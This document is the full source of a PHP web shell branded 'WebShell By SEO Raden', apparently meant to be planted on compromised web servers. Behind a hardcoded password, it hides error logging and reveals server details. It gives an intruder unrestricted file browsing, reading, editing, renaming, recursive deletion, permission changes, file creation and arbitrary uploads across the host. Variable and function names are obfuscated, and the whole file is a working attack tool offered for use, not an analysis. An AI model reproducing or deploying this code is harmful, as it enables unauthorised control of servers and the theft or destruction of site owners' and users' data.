<?php
@set_time_limit(0);
@clearstatcache();
error_reporting(0);
@ini_set('error_log',null);
@ini_set('log_errors',0);
@ini_set('max_execution_time',0);
@ini_set('display_errors', 0);
@ini_set('display_startup_errors', '0');
@ini_set('memory_limit', '-1');
@ini_set('output_buffering', '0');
@ini_set('implicit_flush', '1');
ob_implicit_flush(true);
header('Content-Type: text/html; charset=utf-8');
header('X-Requested-With: XMLHttpRequest');
header('Cache-Control: no-cache, no-store, must-revalidate');
header('Pragma: no-cache');
header('Expires: 0');
session_start();
if (md5($_POST["password"]) == md5('jal888')) {
    $_SESSION["isLogin"] = true;
} else {
    XWoSq();
}
function SVpSK()
{
    $AyqtG = ["ip" => $_SERVER["SERVER_ADDR"], "host" => gethostname(), "kernel" => php_uname(), "disablefunc" => ini_get("disable_functions"), "path" => getcwd(), "os" => PHP_OS];
    return $AyqtG;
}
$ATvR0 = svPSK();
if (strtoupper(substr($ATvR0["os"], 0, 3)) == "WIN") {
    $ATvR0["os"] = "Windows";
    $a0LJa = explode("\\", $ATvR0["path"]);
    $a0LJa = $a0LJa[0] . "/";
} else {
    if (strtoupper(substr($ATvR0["os"], 0, 3)) == "LIN") {
        $ATvR0["os"] = "Linux";
        $a0LJa = "/";
    }
}
$tnyU3 = getcwd();
if (isset($_GET["path"])) {
    $UWl_4 = str_replace("\\", "/", $_GET["path"]);
    $UWl_4 = str_replace("//", "/", $_GET["path"]);
    $PJlAa = explode("/", $UWl_4);
} else {
    $UWl_4 = str_replace("\\", "/", $tnyU3);
    $PJlAa = explode("/", $UWl_4);
}
function XWosq()
{
    if (!isset($_SESSION["isLogin"])) {
        echo "<style>\r\n            body{\r\n                background-color: grey;\r\n            }\r\n  .centered-form {\r\n    display: flex;\r\n    justify-content: center;\r\n    align-items: center;\r\n    height: 100%;\r\n  }\r\n  .centered-form form {\r\n    background-color: #f0f0f0;\r\n    padding: 20px;\r\n    border-radius: 5px;\r\n    box-shadow: 0 0 10px rgba(0, 0, 0, 0.2);\r\n    display: flex;\r\n    flex-direction: column;\r\n    align-items: center;\r\n  }\r\n  .centered-form input[type='password'] {\r\n    padding: 10px;\r\n    margin: 5px;\r\n    border: 1px solid #ccc;\r\n    border-radius: 5px;\r\n  }\r\n  .centered-form button {\r\n    padding: 10px 20px;\r\n    background-color: #007bff;\r\n    color: white;\r\n    border: none;\r\n    border-radius: 5px;\r\n    cursor: pointer;\r\n  }\r\n</style>";
        echo "<div class='centered-form'>\r\n  <form method='POST'>\r\n    <input type='password' name='password'>\r\n    <button type='submit'>Submit</button>\r\n  </form>\r\n</div>";
        die;
    }
}
function rzQgm($wn0Hz)
{
    $mYDIb = fileperms($wn0Hz);
    switch ($mYDIb & 0xf000) {
        case 0xc000:
            $pcpDP = "s";
            break;
        case 0xa000:
            $pcpDP = "l";
            break;
        case 0x8000:
            $pcpDP = "-";
            break;
        case 0x6000:
            $pcpDP = "b";
            break;
        case 0x4000:
            $pcpDP = "d";
            break;
        case 0x2000:
            $pcpDP = "c";
            break;
        case 0x1000:
            $pcpDP = "p";
            break;
        default:
            $pcpDP = "u";
    }
    $pcpDP .= $mYDIb & 0x100 ? "r" : "-";
    $pcpDP .= $mYDIb & 0x80 ? "w" : "-";
    $pcpDP .= $mYDIb & 0x40 ? $mYDIb & 0x800 ? "s" : "x" : ($mYDIb & 0x800 ? "S" : "-");
    $pcpDP .= $mYDIb & 0x20 ? "r" : "-";
    $pcpDP .= $mYDIb & 0x10 ? "w" : "-";
    $pcpDP .= $mYDIb & 0x8 ? $mYDIb & 0x400 ? "s" : "x" : ($mYDIb & 0x400 ? "S" : "-");
    $pcpDP .= $mYDIb & 0x4 ? "r" : "-";
    $pcpDP .= $mYDIb & 0x2 ? "w" : "-";
    $pcpDP .= $mYDIb & 0x1 ? $mYDIb & 0x200 ? "t" : "x" : ($mYDIb & 0x200 ? "T" : "-");
    return $pcpDP;
}
function KpHNQ($b30SH)
{
    $SmhMA = sprintf("%u", filesize($b30SH));
    if ($SmhMA > 0) {
        $H6Jju = intval(log($SmhMA, 1024));
        $oqa49 = array("B", "KB", "MB", "GB");
        if (array_key_exists($H6Jju, $oqa49) === true) {
            return sprintf("%d %s", $SmhMA / pow(1024, $H6Jju), $oqa49[$H6Jju]);
        }
    }
    return $SmhMA;
}
function xWsgc($q57LJ)
{
    $nA1Dr = filter_var(htmlspecialchars(file_get_contents($q57LJ)), FILTER_SANITIZE_STRING);
    return $nA1Dr;
}
function sDm4F($TX7MV)
{
    $G38wm = array_diff(scandir($TX7MV), array(".", ".."));
    foreach ($G38wm as $Wchvt) {
        is_dir("{$TX7MV}/{$Wchvt}") ? Sdm4F("{$TX7MV}/{$Wchvt}") : unlink("{$TX7MV}/{$Wchvt}");
    }
    return rmdir($TX7MV);
}
function Yos7s($qjgU8, $PF6cr)
{
    $MficX = move_uploaded_file($qjgU8, $PF6cr);
    if ($MficX) {
        return true;
    } else {
        return false;
    }
}
function d72yI($rx1u6)
{
    $HePg9 = realpath($rx1u6);
    if ($HePg9 !== false and is_dir($HePg9)) {
        return true;
    }
    return false;
}
if (isset($_GET["path"])) {
    $SqtP3 = $_GET["path"];
    $W1hbH = explode("/", $SqtP3);
    if (is_file($SqtP3)) {
        $RVkdA = XWSGC($SqtP3);
        $jbWgR = true;
        $Lhf_4 = scandir($SqtP3);
    } else {
        $Lhf_4 = array_diff(scandir($SqtP3), [".", ".."]);
    }
} else {
    $SqtP3 = $UWl_4;
    $Lhf_4 = array_diff(scandir($SqtP3), [".", ".."]);
}
if (isset($_POST["pilihan"])) {
    switch ($_POST["pilihan"]) {
        case $_POST["pilihan"] == "edit":
            $jGES5 = true;
            $nQil0 = $_POST["dir"];
            $Vfz2z = $_POST["sourceFile"];
            if (empty($Vfz2z)) {
            } else {
                if (file_put_contents($nQil0, $Vfz2z)) {
                    $eyXvJ = "Berhasil di edit";
                } else {
                    $eyXvJ = "Gagal edit";
                }
            }
            break;
        case $_POST["pilihan"] == "rename":
            $LHhIf = true;
            $nQil0 = $_POST["dir"];
            $oCV_z = $_POST["namaFile"];
            $LQ5An = $_POST["namaBaru"];
            if (empty($LQ5An)) {
            } else {
                if (rename($nQil0, $_GET["path"] . "/" . $LQ5An)) {
                    $oCV_z = $LQ5An;
                    $nQil0 = $_GET["path"] . "/" . $LQ5An;
                    $UC_Jg = "Berhasil rename";
                } else {
                    $UC_Jg = "Gagal rename";
                }
            }
            break;
        case $_POST["pilihan"] == "delete":
            $nQil0 = $_POST["dir"];
            $z9ukZ = $_POST["type"];
            if (isset($nQil0) && is_file($nQil0)) {
                if (unlink($nQil0)) {
                    $lD7Hf = "<script>\r\n\t\t\t\t\t\t\t\t\talert('File berhasil dihapus!!');\r\n\t\t\t\t\t\t\t\t\twindow.location.href = window.location.href;\r\n\t\t\t\t\t\t\t\t    </script>";
                } else {
                    $lD7Hf = "<script>\r\n\t\t\t\t\t\t\t\t\talert('File gagal dihapus!!');\r\n\t\t\t\t\t\t\t\t\twindow.location.href = window.location.href;\r\n\t\t\t\t\t\t\t\t    </script>";
                }
            } else {
                if (!(isset($nQil0) && is_dir($nQil0))) {
                } else {
                    if (SDM4F($nQil0)) {
                        $lD7Hf = "<script>\r\n\t\t\t\t\t\t\t\t\talert('Folder berhasil dihapus!!');\r\n\t\t\t\t\t\t\t\t\twindow.location.href = window.location.href;\r\n\t\t\t\t\t\t\t\t    </script>";
                    } else {
                        $lD7Hf = "<script>\r\n\t\t\t\t\t\t\t\t\talert('Folder gagal dihapus!!');\r\n\t\t\t\t\t\t\t\t\twindow.location.href = window.location.href;\r\n\t\t\t\t\t\t\t\t    </script>";
                    }
                }
            }
            break;
        case $_POST["pilihan"] == "chmod":
            $uMVZd = true;
            $Wchvt = fileperms($_POST["dir"]);
            $nx0IL = substr(sprintf("%o", $Wchvt), -4);
            $nQil0 = $_POST["dir"];
            $mYDIb = octdec($_POST["perms"]);
            if (!isset($_POST["perms"])) {
            } else {
                if (!isset($mYDIb)) {
                } else {
                    if (chmod($nQil0, $mYDIb)) {
                        $nx0IL = decoct($mYDIb);
                        $yA1W_ = "Berhasil chmod!";
                    } else {
                        $yA1W_ = "Gagal chmod!";
                    }
                }
            }
            break;
        case $_POST["pilihan"] == "create":
            $MABtn = '';
            $xoB1l = '';
            $uUj9T = $_GET["path"] . "/";
            if (!isset($_POST["createAction"])) {
            } else {
                $MABtn = $_POST["createName"];
                $xoB1l = $_POST["createIsi"] == NULL ? " " : $_POST["createIsi"];
                if (!file_exists($uUj9T . $MABtn)) {
                    if (file_put_contents($uUj9T . $MABtn, $xoB1l)) {
                        $Ec7sL = "File berhasil dibuat";
                    } else {
                        $Ec7sL = "Directory not Writable";
                    }
                } else {
                    $Ec7sL = "Nama file / folder sudah ada";
                }
            }
            break;
        case $_POST["pilihan"] == "createFolder":
            $uUj9T = $_GET["path"] . "/";
            if (!isset($_POST["createFolder"])) {
            } else {
                $Q7vH_ = $_POST["createName"];
                if (mkdir($uUj9T . $Q7vH_)) {
                    $Ec7sL = "Folder berhasil dibuat";
                } else {
                    if (is_dir($Q7vH_)) {
                        $Ec7sL = "Nama Folder / File sudah ada";
                    } else {
                        if (!is_writable($uUj9T)) {
                            $Ec7sL = "Directory not writable";
                        } else {
                        }
                    }
                }
            }
            break;
        case $_POST["pilihan"] == "upload":
            $HePg9 = $UWl_4;
            if (isset($_GET["path"])) {
                $HePg9 = $_GET["path"];
            }
            if (empty($_FILES)) {
            } else {
                if (yOS7s($_FILES["uploadFile"]["tmp_name"], $HePg9 . "/" . $_FILES["uploadFile"]["name"])) {
                    echo "<script>\r\n\t\t\t\t\t\t  alert('File uploaded successfully!!');\r\n\t\t\t\t\t\t  window.location.href = window.location.href;\r\n\t\t\t\t\t\t  </script>";
                } else {
                    echo "<script>\r\n\t\t\t\t\t\t  alert('File upload failed!!');\r\n\t\t\t\t\t\t  window.location.href = window.location.href;\r\n\t\t\t\t\t\t  </script>";
                }
            }
            break;
    }
}
echo "\r\n<!DOCTYPE html>\r\n<html>\r\n<head>\r\n\t<title>SeoRaden Shell</title>\r\n</head>\r\n<link href=\"https://fonts.googleapis.com/icon?family=Material+Icons\" rel=\"stylesheet\">\r\n<link rel=\"stylesheet\" href=\"https://cdnjs.cloudflare.com/ajax/libs/materialize/1.0.0/css/materialize.min.css\">\r\n<meta name=\"viewport\" content=\"width=1024\">\r\n<meta name=\"viewport\" content=\"width=device-width, initial-scale=1.0\"/>\r\n<meta name=\"viewport\" content=\"width=device-width, initial-scale=0.60, shrink-to-fit=no\">\r\n<style type=\"text/css\">\r\n\tbody {\r\n\t\twidth: 100vw;\r\n  \t\theight: 100px;\r\n\t\toverflow-x: hidden !important;\r\n\t}\r\n\t.info {\r\n\t\tdisplay: block;\r\n\t\twidth: 100%;\r\n\t}\r\n\t\t\r\n\ttable.striped > tbody > tr:nth-child(odd) {\r\n\t\tbackground-color: rgba(170, 213, 213, 0.5);\r\n\t}\r\n\tnav {\r\n\t\tbackground-color: #42a5f5;\r\n\t}\r\n\t.select-wrapper {\r\n\t\tposition: relative;\r\n\t\twidth: 100px;\r\n\t\tdisplay: inline-block;\r\n\t}\r\n\r\n\t.file-field .btn, .file-field .btn-large, .file-field .btn-small {\r\n\t\tfloat: inherit;\r\n\t\theight: 3rem;\r\n\t\tline-height: 3rem;\r\n\t}\r\n\r\n\t.select-wrapper .caret {\r\n\t\tright: auto !important;\r\n\t}\r\n\r\n\t.select-wrapper input.select-dropdown {\r\n\t\twidth: 50%;\r\n\t}\r\n\r\n\ttextarea {\r\n    \theight: 50rem !important;\r\n\t\toverflow-y: scroll !important;\r\n\t\theight: 700px !important;\r\n\t}\r\n\r\n\t.maung {\r\n\t\theight: 700px !important;\r\n\t}\r\n\r\n\ttable{\r\n\t\twidth:100%;\r\n\t\ttable-layout: fixed;\r\n\t\toverflow-wrap: break-word;\r\n\t}\r\n\t\r\n\t@media screen and (max-width: 732px) {\r\n\t\t.navbar-text {\r\n\t\t\tfont-size: 25px !important;\r\n\t\t\twidth: 280px !important;\r\n\t\t}\r\n\t}\r\n\r\n</style>\r\n<body>\r\n\t<div class=\"content\">\r\n\t<nav>\r\n       <div class=\"container\">\r\n\t    <div class=\"nav-wrapper\">\r\n\t      <a href=\"https://t.me/seoraden77\" target=\"_blank\"  class=\"brand-logo center navbar-text\">WebShell By SEO Raden</a>\r\n\t    </div>\r\n\t   </div>\r\n  \t</nav>\r\n\r\n  \t<div class=\"container\" style=\"margin-top: 30px;\">\r\n        <b class=\"info\">Server IP : ";
echo $ATvR0["ip"];
echo "</b>\r\n        <b class=\"info\">Hostname : ";
echo $ATvR0["host"];
echo "</b>\r\n        <b class=\"info\">Kernel : ";
echo $ATvR0["kernel"];
echo "</b>\r\n        <b class=\"info\">OS : ";
echo $ATvR0["os"];
echo "</b>\r\n\t\t<b class=\"info\">USER : ";
echo get_current_user();
echo "</b>\r\n\t</div>\r\n\t<br>\t\r\n\t";
if ($jbWgR) {
    echo "\r\n<div class=\"container\">\r\n<div class=\"row\">\r\n\t<div style=\"font-size: 17px;\">\r\n\t";
    echo "<a href=\"?path=" . $a0LJa . "\">" . "-" . "</a>";
    $jLZSy = 1;
    while ($jLZSy < count($PJlAa)) {
        $rw3zM = implode("/", array_slice($PJlAa, 1, $jLZSy));
        echo "/";
        echo "<a href=\"?path=/" . urlencode($rw3zM) . "\">" . $PJlAa[$jLZSy] . "</a>";
        $jLZSy++;
    }
    echo "\t</div>\r\n    <form class=\"col s12\">\r\n      <div class=\"row\">\r\n        <div class=\"input-field col s12\">\r\n          <textarea id=\"textarea\" class=\"materialize-textarea\" style=\"background-color: ghostwhite; overflow-y: auto;\" disabled>";
    echo $RVkdA;
    echo "</textarea>\r\n        </div>\r\n      </div>\r\n    </form>\r\n  </div>\r\n </div>\r\n\t";
} else {
    if ($jGES5) {
        echo "\t\t<div class=\"container\">\r\n\t\t";
        echo "<a href=\"?path=" . $a0LJa . "\">" . "-" . "</a>";
        $jLZSy = 1;
        while ($jLZSy < count($PJlAa)) {
            $rw3zM = implode("/", array_slice($PJlAa, 1, $jLZSy));
            echo "/";
            echo "<a href=\"?path=/" . urlencode($rw3zM) . "\">" . $PJlAa[$jLZSy] . "</a>";
            $jLZSy++;
        }
        echo "\t\t";
        echo !empty($eyXvJ) ? "<p class='blue-text text-darken-2'>" . $eyXvJ . "</p>" : '';
        echo "\t\t<form method=\"POST\">\r\n\t\t<input type=\"hidden\" name=\"dir\" value=\"";
        echo $nQil0;
        echo "\">\r\n\t\t<input type=\"hidden\" name=\"pilihan\" value=\"edit\">\r\n\t\t<div class=\"row\">\r\n\t\t\t<form class=\"col s12\">\r\n\t\t\t\t<div class=\"input-field col s12\">\r\n\t\t\t\t<textarea name=\"sourceFile\" id=\"textarea\" class=\"materialize-textarea\" style=\"background-color: ghostwhite; overflow-y: auto;\" >";
        echo XwSGC($nQil0);
        echo "</textarea>\r\n\t\t\t\t<label for=\"textarea\" class='active'>Edit File</label>\r\n\t\t\t\t<button class=\"btn waves-effect waves-light\" type=\"submit\" name=\"action\">Edit</button>\r\n\t\t\t</form>\r\n\t\t</div>\r\n\t\t</form>\r\n\t\t</div>\r\n\t";
    } else {
        if ($LHhIf) {
            echo "\t\t<div class=\"container\">\r\n\t\t";
            echo "<a href=\"?path=" . $a0LJa . "\">" . "-" . "</a>";
            $jLZSy = 1;
            while ($jLZSy < count($PJlAa)) {
                $rw3zM = implode("/", array_slice($PJlAa, 1, $jLZSy));
                echo "/";
                echo "<a href=\"?path=/" . urlencode($rw3zM) . "\">" . $PJlAa[$jLZSy] . "</a>";
                $jLZSy++;
            }
            echo "\t\t";
            echo !empty($UC_Jg) ? "<p class='blue-text text-darken-2'>" . $UC_Jg . "</p>" : '';
            echo "\t\t<form method=\"POST\">\r\n\t\t\t<input type=\"hidden\" name=\"dir\" value=\"";
            echo $nQil0;
            echo "\">\r\n\t\t\t<input type=\"hidden\" name=\"pilihan\" value=\"rename\">\r\n\t\t\t  <div class=\"row center-align\">\r\n\t\t\t    <div class=\"input-field col s12\">\r\n\t\t\t      <input value=\"";
            echo $oCV_z;
            echo "\" name=\"namaBaru\" id=\"rename\" type=\"text\" class=\"validate\">\r\n\t\t\t      <label class=\"active\" for=\"rename\">Input disini:</label>\r\n\t\t\t      <button class=\"btn waves-effect waves-light\" type=\"submit\" name=\"action\">Rename</button>\r\n\t\t\t    </div>\r\n\t\t\t  </div>\t\t\t  \r\n\t\t</form>\r\n\t\t</div>\r\n\t";
        } else {
            if ($uMVZd) {
                echo "\t\t<div class=\"container\">\r\n\t\t";
                echo "<a href=\"?path=" . $a0LJa . "\">" . "-" . "</a>";
                $jLZSy = 1;
                while ($jLZSy < count($PJlAa)) {
                    $rw3zM = implode("/", array_slice($PJlAa, 1, $jLZSy));
                    echo "/";
                    echo "<a href=\"?path=/" . urlencode($rw3zM) . "\">" . $PJlAa[$jLZSy] . "</a>";
                    $jLZSy++;
                }
                echo "\t\t";
                echo !empty($yA1W_) ? "<p class='blue-text text-darken-2'>" . $yA1W_ . "</p>" : '';
                echo "\t\t<form method=\"POST\">\r\n\t\t\t<input type=\"hidden\" name=\"dir\" value=\"";
                echo $nQil0;
                echo "\">\r\n\t\t\t<input type=\"hidden\" name=\"pilihan\" value=\"chmod\">\r\n\t\t\t  <div class=\"row center-align\">\r\n\t\t\t    <div class=\"input-field col s12\">\r\n\t\t\t      <input value=\"";
                echo $nx0IL;
                echo "\" name=\"perms\" id=\"chmod\" type=\"text\" class=\"validate\">\r\n\t\t\t      <label class=\"active\" for=\"chmod\">Input disini:</label>\r\n\t\t\t      <button class=\"btn waves-effect waves-light\" type=\"submit\" name=\"action\">Chmod</button>\r\n\t\t\t    </div>\r\n\t\t\t  </div>\r\n\t\t</form>\r\n\t\t</div>\r\n\t";
            } else {
                if (isset($_GET["create"])) {
                    echo "\t\t<br>\r\n\t\t<div class=\"container\">\r\n\t\t";
                    echo "<a href=\"?path=" . $a0LJa . "\">" . "-" . "</a>";
                    $jLZSy = 1;
                    while ($jLZSy < count($PJlAa)) {
                        $rw3zM = implode("/", array_slice($PJlAa, 1, $jLZSy));
                        echo "/";
                        echo "<a href=\"?path=/" . urlencode($rw3zM) . "\">" . $PJlAa[$jLZSy] . "</a>";
                        $jLZSy++;
                    }
                    echo "\t\t";
                    echo !empty($Ec7sL) ? "<p class='blue-text text-darken-2'>" . $Ec7sL . "</p>" : '';
                    echo "\t\t<form method=\"POST\">\r\n\t\t\t<input type=\"hidden\" name=\"pilihan\" value=\"create\">\r\n\t\t\t  <div class=\"row center-align\">\r\n\t\t\t    <div class=\"input-field col s12\">\r\n\t\t\t      <input name=\"createName\" id=\"createFile\" type=\"text\" class=\"validate\" value=\"";
                    echo $MABtn;
                    echo "\">\r\n\t\t\t      <label class=\"active\" for=\"createFile\">Nama File</label>\r\n\t\t\t      <textarea name=\"createIsi\" class=\"materialize-textarea\" style=\"height: 400px; background-color: ghostwhite; overflow-y: scroll;\">";
                    echo $xoB1l;
                    echo "</textarea>\r\n\t\t\t      <button class=\"btn waves-effect waves-light\" type=\"submit\" name=\"createAction\">Create</button>\r\n\t\t\t    </div>\r\n\t\t\t  </div>\r\n\t\t</form>\r\n\t\t</div>\r\n\t";
                } else {
                    if (isset($_GET["createFolder"])) {
                        echo "\t\t<div class=\"container\">\r\n\t\t";
                        echo "<a href=\"?path=" . $a0LJa . "\">" . "-" . "</a>";
                        $jLZSy = 1;
                        while ($jLZSy < count($PJlAa)) {
                            $rw3zM = implode("/", array_slice($PJlAa, 1, $jLZSy));
                            echo "/";
                            echo "<a href=\"?path=/" . urlencode($rw3zM) . "\">" . $PJlAa[$jLZSy] . "</a>";
                            $jLZSy++;
                        }
                        echo "\t\t";
                        echo !empty($Ec7sL) ? "<p class='blue-text text-darken-2'>" . $Ec7sL . "</p>" : '';
                        echo "\t\t<form method=\"POST\">\r\n\t\t\t<input type=\"hidden\" name=\"pilihan\" value=\"createFolder\">\r\n\t\t\t  <div class=\"row center-align\">\r\n\t\t\t    <div class=\"input-field col s12\">\r\n\t\t\t      <input name=\"createName\" id=\"createFolder\" type=\"text\" class=\"validate\" value=\"";
                        echo $Q7vH_;
                        echo "\">\r\n\t\t\t      <label class=\"active\" for=\"createFolder\">Nama Folder</label>\r\n\t\t\t      <button class=\"btn waves-effect waves-light\" type=\"submit\" name=\"createFolder\">Create</button>\r\n\t\t\t    </div>\r\n\t\t\t  </div>\r\n\t\t</form>\r\n\t\t</div>\r\n\t";
                    } else {
                        echo "   <div class=\"container\">\t\r\n   <b class=\"info\">\r\n\t <a href=\"?create&path=";
                        echo isset($_GET["path"]) ? $_GET["path"] : $UWl_4;
                        echo "\" class=\"btn-floating btn-large waves-effect waves-light red\"><i class=\"material-icons\">add</i></a> <b>Add File&nbsp;&nbsp;&nbsp;</b>\r\n\t <a href=\"?createFolder&path=";
                        echo isset($_GET["path"]) ? $_GET["path"] : $UWl_4;
                        echo "\" class=\"btn-floating btn-large waves-effect waves-light blue\"\"><i class=\"material-icons\">add</i></a> <b>Add Folder</b>\r\n\t<br>\r\n\t<b class=\"info\">\r\n\t\t <form method=\"POST\" enctype=\"multipart/form-data\">\r\n\t\t    <div class=\"file-field input-field\">\r\n\t\t      <div class=\"btn\">\r\n\t\t        <span>File</span>\r\n\t\t        <input type=\"hidden\" name=\"pilihan\" value=\"upload\">\r\n\t\t        <input type=\"hidden\" name=\"dir\" value=\"";
                        echo $_GET["path"];
                        echo "\">\r\n\t\t        <input type=\"file\" name=\"uploadFile\">\r\n\t\t      </div>\r\n\t\t      <div class=\"file-path-wrapper\">\r\n\t\t        <input class=\"file-path validate\" type=\"text\" style=\"width: 300px\">\r\n\t\t        <button class=\"btn waves-effect waves-light\" type=\"submit\" name=\"actionUpload\">Upload!\r\n\t\t\t\t</button>\r\n\t\t      </div>\r\n\t\t    </div>\r\n  \t\t</form>\r\n\t</b>\r\n\t<!-- <div style=\"font-size: 18px;\"> -->\r\n\t<div class=\"row\"><div class=\"col s12\" style=\"font-size: 18px;\">\r\n\tPATH:\r\n\t";
                        echo "<a href=\"?path=" . $a0LJa . "\">" . "-" . "</a>";
                        $jLZSy = 1;
                        while ($jLZSy < count($PJlAa)) {
                            $rw3zM = implode("/", array_slice($PJlAa, 1, $jLZSy));
                            echo "/";
                            echo "<a href=\"?path=/" . urlencode($rw3zM) . "\">" . $PJlAa[$jLZSy] . "</a>";
                            $jLZSy++;
                        }
                        echo "\t</div></div>\r\n</div>\r\n\r\n   <div class=\"container\">\t\r\n\t<table class=\"striped centered bordered\">\r\n\t\t";
                        echo !empty($lD7Hf) ? $lD7Hf : '';
                        echo "\t\t\t\r\n\t\t<thead>\t\r\n\t\t<tr>\r\n\t\t\t<th>Nama</th>\r\n\t\t\t<th>Size</th>\r\n\t\t\t<th>Permission</th>\r\n\t\t\t<th>Action</th>\r\n\t\t</tr>\r\n\t\t</thead>\r\n\t\t";
                        foreach ($Lhf_4 as $tnyU3) {
                            echo "\t\t<tr>\r\n\t\t\t<td><a style=\"color: black;\" href=\"?path=";
                            echo str_replace([".", "//"], ["%2e", "/"], $SqtP3 . "/" . $tnyU3);
                            echo "\">";
                            echo $tnyU3;
                            echo "</a></td>\r\n\t\t\t<td style=\"color:red\">";
                            echo is_file($SqtP3 . "/" . $tnyU3) ? KPHnQ($SqtP3 . "/" . $tnyU3) : "Directory";
                            echo "</td>\r\n\t\t\t<td>";
                            echo is_writable($SqtP3 . "/" . $tnyU3) ? "<font color=\"green\">" . @rzQGM($SqtP3 . "/" . $tnyU3) . "</font>" : "<font color=\"red\">" . @RZqgM($SqtP3 . "/" . $tnyU3) . "</font>";
                            echo "</td>\r\n\t\t\t<td>\r\n\t\t\t\t";
                            if (is_file($SqtP3 . "/" . $tnyU3)) {
                                echo "\t\t\t\t<form method=\"POST\" action=\"?set&path=";
                                echo $SqtP3;
                                echo "\">\r\n\t\t\t\t\t<center>\r\n\t\t\t\t\t<select class=\"browser-default\" name=\"pilihan\" style=\"height: 30px; width: 100px; z-index: 1;\">\r\n\t\t\t\t\t\t<option value=\"Select\" disabled selected>Select</option>\r\n\t\t\t\t\t\t<option value=\"rename\">Rename</option>\r\n\t\t\t\t\t\t<option value=\"edit\">Edit</option>\r\n\t\t\t\t\t\t<option value=\"delete\">Delete</option>\r\n\t\t\t\t\t\t<option value=\"chmod\">Chmod</option>\r\n\t\t\t\t\t</select>\r\n\t\t\t\t\t</center>\r\n\t\t\t\t\t<input type=\"hidden\" name=\"type\" value=\"file\">\r\n\t\t\t\t\t<input type=\"hidden\" name=\"namaFile\" value=\"";
                                echo $tnyU3;
                                echo "\">\r\n\t\t\t\t\t<input type=\"hidden\" name=\"dir\" value=\"";
                                echo $SqtP3 . "/" . $tnyU3;
                                echo "\">\r\n\t\t\t\t\t <button class=\"btn waves-effect waves-light\" type=\"submit\" name=\"action\">\r\n\t\t\t\t\t    <i class=\"material-icons right\">send</i>\r\n\t\t\t\t\t </button>\r\n\t\t\t\t</form>\r\n\t\t\t\t";
                            } else {
                                echo "\t\t\t\t<form method=\"POST\" action=\"?set&path=";
                                echo $SqtP3;
                                echo "\">\t\r\n\t\t\t\t\t<center>\r\n\t\t\t\t\t<select class=\"browser-default\" name=\"pilihan\" style=\"height: 30px; width: 100px; z-index: 1;\" name=\"pilihan\">\r\n\t\t\t\t\t\t<option value=\"Select\" disabled selected>Select</option>\r\n\t\t\t\t\t\t<option value=\"rename\">Rename</option>\r\n\t\t\t\t\t\t<option value=\"delete\">Delete</option>\r\n\t\t\t\t\t\t<option value=\"chmod\">Chmod</option>\r\n\t\t\t\t\t</select>\r\n\t\t\t\t\t</center>\r\n\t\t\t\t\t<input type=\"hidden\" name=\"type\" value=\"folder\">\r\n\t\t\t\t\t<input type=\"hidden\" name=\"namaFile\" value=\"";
                                echo $tnyU3;
                                echo "\">\r\n\t\t\t\t\t<input type=\"hidden\" name=\"dir\" value=\"";
                                echo $SqtP3 . "/" . $tnyU3;
                                echo "\">\r\n\t\t\t\t\t<button class=\"btn waves-effect waves-light\" type=\"submit\" name=\"action\">\r\n\t\t\t\t\t    <i class=\"material-icons right\">send</i>\r\n\t\t\t\t\t</button>\r\n\t\t\t\t</form>\r\n\t\t\t\t";
                            }
                            echo "\t\t\t</td>\r\n\t\t</tr>\r\n\t\t";
                        }
                        echo "\t</table>\r\n</div>\r\n\t";
                    }
                }
            }
        }
    }
}
echo "</div>\r\n\r\n\t<footer id=\"footer\" style=\"margin-top: 100px;\">\r\n\r\n\t</footer>\r\n\r\n<script src=\"https://cdnjs.cloudflare.com/ajax/libs/materialize/1.0.0/js/materialize.min.js\"></script>\r\n<script> \r\n\r\nvar footer = document.querySelector(\"footer\");\r\n\r\nfunction stopScrollAtFooter() {\r\n    var footerHeight = footer.clientHeight;\r\n    var contentHeight = document.body.scrollHeight;\r\n    var scrollY = window.scrollY;\r\n\r\n\tif (scrollY + window.innerHeight >= contentHeight - footerHeight) {\r\n\t\t\twindow.scrollTo(0, contentHeight - window.innerHeight);\r\n\t\t}\r\n\t}\r\n\r\n\twindow.addEventListener(\"scroll\", stopScrollAtFooter);\r\n\r\n\r\n\tdocument.addEventListener('DOMContentLoaded', function() {\r\n    var elems = document.querySelectorAll('select');\r\n    var instances = M.FormSelect.init(elems, {});\r\n  });\r\n</script>\r\n</body>\r\n</html>";

